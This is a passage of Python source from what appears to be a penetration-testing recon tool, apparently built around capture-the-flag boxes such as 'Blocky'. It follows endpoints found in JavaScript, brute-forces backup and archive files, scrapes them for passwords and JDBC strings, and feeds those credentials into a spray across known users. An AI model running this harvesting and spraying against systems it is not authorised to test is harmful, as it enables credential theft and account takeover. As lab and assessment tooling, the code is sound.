                findings.add_summary(f"⚠ Possible secret in JS `{url.split('/')[-1]}`: `{val[:40]}...`")
        if endpoints:
            findings.bullet(f"**`{url.split('/')[-1]}`** — endpoints: "
                            f"{', '.join(f'`{e}`' for e in endpoints[:8])}")
            for e in endpoints:
                if e.lower().split("?")[0].endswith(_ASSET_EXT):
                    continue
                # Resolve relative refs against BOTH the JS file's dir and the site
                # root — a `scan.php` could live under either.
                followups.add(urljoin(url, e))
                followups.add(urljoin(base_url.rstrip("/") + "/", e.lstrip("/")))

    _follow_js_endpoints(followups, runner, findings)


def _follow_js_endpoints(endpoints: set[str], runner: Runner, findings: Findings):
    """Fetch endpoints referenced in JS (the Blocky gap: loot sat behind a `.php`
    named only inside a linked script.js). Reports live ones and scans their bodies
    for secret literals."""
    if not endpoints:
        return
    hits: list[tuple[str, str, int, list[str]]] = []
    for ep in sorted(endpoints)[:25]:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}", ep],
            capture_output=True, text=True,
        )
        parts = r.stdout.rsplit("\n", 1)
        code = parts[-1].strip() if len(parts) > 1 else "000"
        body = parts[0] if len(parts) > 1 else r.stdout
        if code in ("200", "301", "302", "401", "403", "500"):
            hits.append((ep, code, len(body), _JS_SECRET_RE.findall(body)))

    if not hits:
        return
    findings.h4("Linked Endpoints (followed from JS)")
    for ep, code, size, secrets in hits:
        findings.bullet(f"`{ep}` — HTTP {code} ({size}b)")
        if code == "200":
            findings.add_summary(f"JS-linked endpoint live: `{ep}` (HTTP 200)")
        for s in secrets[:3]:
            findings.bullet(f"  ⚠ secret-like: `{s[:50]}`")
            findings.add_summary(f"⚠ Secret in JS-linked `{ep}`: `{s[:40]}...`")


# ── Downloadable-artifact secret scan ─────────────────────────────────────────

# Credential literals inside artifacts (.jar/.war/.zip/.config/.properties/.sql).
# Captures the assigned value AND keeps the line for context. Covers prop-style
# (password=...), XML (<password>...</password>), and JDBC/connection strings.
_ARTIFACT_SECRET_RE = re.compile(
    r'(?i)(?:password|passwd|pwd|secret|api[_-]?key|apikey|access[_-]?key|'
    r'auth[_-]?token|token|connection[_-]?string|db[_-]?pass\w*|user(?:name)?)'
    r'\s*[=:>]+\s*["\']?([^\s"\'<>;,]{3,80})'
)
# Whole JDBC URLs (jdbc:mysql://user:pass@host/db) are themselves the secret.
_JDBC_RE = re.compile(r'(?i)jdbc:[a-z0-9]+://[^\s"\'<>]{4,160}')

# Common artifact filenames worth probing at the web root even with no crawl hit.
_COMMON_ARTIFACTS = [
    "backup.zip", "backup.tar.gz", "backup.tgz", "backup.sql", "backup.bak",
    "db.sql", "database.sql", "dump.sql", "site.zip", "www.zip", "web.zip",
    "app.jar", "application.jar", "app.war", "application.war", "ROOT.war",
    "config.zip", "config.bak", "web.config.bak", "wp-config.php.bak",
    "config.php.bak", ".env.bak", "credentials.zip",
]
_ARTIFACT_FFUF_EXTS = ".jar,.war,.zip,.tar.gz,.sql,.bak,.config,.properties,.gz"

# Archive members worth string-scanning (compiled .class included — Java string
# constants like hardcoded DB creds survive into the class file; Blocky's loot
# was a hardcoded cred inside BlockyCore.jar).
_SCAN_MEMBER_HINT = (".class", ".xml", ".properties", ".config", ".txt", ".sql",
                     ".java", ".json", ".yml", ".yaml", ".ini", ".conf", ".php")


def _ascii_strings(data: bytes, minlen: int = 4) -> str:
    """`strings(1)`-style: printable ASCII runs ≥ minlen, newline-joined. Lets us
    pull credential literals out of binary artifacts (.class, .jar members)."""
    runs = re.findall(rb"[\x20-\x7e]{%d,}" % minlen, data)
    return "\n".join(s.decode("ascii", "replace") for s in runs)


def _scan_text_for_secrets(text: str, source: str, runner: Runner,
                           findings: Findings) -> int:
    """Regex a blob of text for credential literals; report + record each. Returns
    the count of secrets found."""
    n = 0
    seen: set[str] = set()
    for line in text.splitlines():
        for m in _ARTIFACT_SECRET_RE.finditer(line):
            val = m.group(1).strip()
            if not val or val.lower() in ("null", "true", "false", "none", "") or val in seen:
                continue
            seen.add(val)
            n += 1
            findings.bullet(f"  ⚠ **credential literal** in `{source}`: `{line.strip()[:100]}`")
            findings.add_summary(f"⚠ Credential in artifact `{source}`: `{val[:40]}`")
            _record_cred(runner, val)
        for jm in _JDBC_RE.finditer(line):
            jdbc = jm.group(0).strip()
            if jdbc in seen:
                continue
            seen.add(jdbc)
            n += 1
            findings.bullet(f"  ⚠ **JDBC string** in `{source}`: `{jdbc[:120]}`")
            findings.add_summary(f"⚠ JDBC connection string in `{source}`")
    return n


def _scan_artifact_bytes(url: str, data: bytes, runner: Runner,
                         findings: Findings) -> int:
    """Scan a downloaded artifact for credential literals. Archives (PK/zip/jar/
    war) are walked member-by-member; gzip is decompressed; anything else is
    string-scanned raw. Returns the number of secrets found."""
    import gzip
    import io
    import zipfile
    name = url.split("/")[-1] or url
    total = 0
    try:
        if data[:2] == b"PK":                       # zip / jar / war / apk
            with zipfile.ZipFile(io.BytesIO(data)) as zf:
                for member in zf.namelist()[:200]:
                    if not member.lower().endswith(_SCAN_MEMBER_HINT):
                        continue
                    try:
                        blob = zf.read(member)
                    except Exception:
                        continue
                    text = _ascii_strings(blob) if member.lower().endswith(".class") \
                        else blob.decode("utf-8", "replace")
                    total += _scan_text_for_secrets(text, f"{name}!{member}", runner, findings)
        elif data[:2] == b"\x1f\x8b":               # gzip (maybe .tar.gz)
            raw = gzip.decompress(data)
            total += _scan_text_for_secrets(_ascii_strings(raw), name, runner, findings)
        else:                                       # config/sql/properties/.env/bak
            total += _scan_text_for_secrets(_ascii_strings(data), name, runner, findings)
    except Exception as exc:
        findings.note(f"could not parse artifact `{name}`: {exc}")
    return total


def _download_artifact(url: str) -> bytes | None:
    """GET an artifact; return its bytes only if it's a real file (HTTP 200, not an
    HTML soft-404). Avoids treating a catch-all 200 HTML page as an artifact."""
    r = subprocess.run(
        ["curl", "-sk", "--max-time", "20", "-w", "\n%{http_code}|%{content_type}",
         "--output", "-", url],
        capture_output=True,
    )
    raw = r.stdout
    nl = raw.rfind(b"\n")
    if nl == -1:
        return None
    body, meta = raw[:nl], raw[nl + 1:].decode("ascii", "replace")
    code, _, ctype = meta.partition("|")
    if code.strip() != "200" or not body:
        return None
    if "text/html" in ctype.lower() and body[:2] not in (b"PK", b"\x1f\x8b"):
        return None                                 # HTML catch-all, not an artifact
    return body


def _ffuf_artifacts(base_url: str, runner: Runner, findings: Findings,
                    breadth: Breadth) -> list[str]:
    """Focused ffuf bust for artifact extensions → candidate artifact URLs."""
    wl = web_wordlist("dirs", breadth)
    if not wl:
        return []
    cmd = [
        "ffuf", "-u", f"{base_url}/FUZZ",
        "-w", wl, "-e", _ARTIFACT_FFUF_EXTS,
        "-fc", "404", "-t", str(_FFUF_THREADS),
        "-timeout", _REQ_TIMEOUT, "-ic", "-noninteractive",
    ]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_ffuf_artifacts", timeout=int(_FFUF_TIMEOUT))
    urls = []
    for path, status, _size in _FFUF_RE.findall(_ANSI_RE.sub("", out)):
        if path.lower().split("?")[0].endswith(tuple("." + e for e in
                _ARTIFACT_FFUF_EXTS.replace(".", "").split(","))):
            urls.append(f"{base_url.rstrip('/')}/{path}")
    return urls


def scan_web_artifacts(base_url: str, runner: Runner, findings: Findings,
                       available: set[str], breadth: Breadth = Breadth.STANDARD,
                       extra_urls: list[str] | None = None) -> int:
    """Find downloadable artifacts (.jar/.zip/.war/.config/.sql/…), fetch them and
    scan for credential literals — emitting any hit as a cred fact for the reuse
    spray. Sources: a focused ffuf bust, a curated common-name list, and any URLs
    passed in (e.g. from the crawl). Returns the number of secrets found."""
    findings.h4("Downloadable Artifact Secrets")
    candidates: set[str] = set(extra_urls or [])
    for name in _COMMON_ARTIFACTS:
        candidates.add(f"{base_url.rstrip('/')}/{name}")
    if "ffuf" in available:
        candidates |= set(_ffuf_artifacts(base_url, runner, findings, breadth))

    artifacts = 0
    secrets = 0
    for url in sorted(candidates):
        data = _download_artifact(url)
        if data is None:
            continue
        artifacts += 1
        findings.bullet(f"**Artifact:** `{url}` ({len(data)} bytes)")
        secrets += _scan_artifact_bytes(url, data, runner, findings)

    if artifacts == 0:
        findings.note("No downloadable artifacts found")
    elif secrets == 0:
        findings.note(f"{artifacts} artifact(s) downloaded — no credential literals found")
    else:
        findings.add_summary(f"**{secrets} credential literal(s)** scraped from "
                             f"{artifacts} downloadable artifact(s) — sprayed across known users")
    return secrets


# ── Parameter discovery ───────────────────────────────────────────────────────

def _param_fuzz(base_url: str, runner: Runner, findings: Findings):
    findings.h4("Parameter Discovery (arjun)")
    cmd = ["arjun", "-u", base_url, "--stable", "-oT", "/dev/stdout"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_arjun", timeout=300)
    params = re.findall(r"\[([+!])\]\s+(\w+)", out)
    found = [p for flag, p in params if flag == "+"]
    if found:
        findings.bullet(f"**Parameters:** {', '.join(f'`{p}`' for p in found)}")
        findings.add_summary(f"Arjun found parameters on {base_url}: {', '.join(found)}")
    elif out.strip() and "[" in out:
        findings.code_block(_trim(out))


# ── Helpers ───────────────────────────────────────────────────────────────────

def _print_ffuf(output: str, findings: Findings) -> list[tuple[str, str, str]]:
    if "[TIMEOUT after" in output:
        findings.bullet("⏱ ffuf timed out before completion — partial results only")
    cleaned = _ANSI_RE.sub("", output)
    results = _FFUF_RE.findall(cleaned)
    for path, status, size in results:
        findings.bullet(f"`/{path}` — {status} ({size}b)")
    if not results:
        findings.note("No results")
    return results


def _build_url(scheme: str, hostname: str, port: int) -> str:
    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
        return f"{scheme}://{hostname}"
    return f"{scheme}://{hostname}:{port}"


def _hh(host_header: str | None) -> list[str]:
    """curl/ffuf/gospider `-H Host:` args, or empty. Lets web requests target a
    vhost by IP+Host header when it has no DNS/etc-hosts entry (and we're not root
    to add one) — the back-half of the redirect→vhost follow-up."""
    return ["-H", f"Host: {host_header}"] if host_header else []


def _label(url: str) -> str:
    return re.sub(r"[^a-z0-9]", "_", url.lower()).strip("_")[:40]
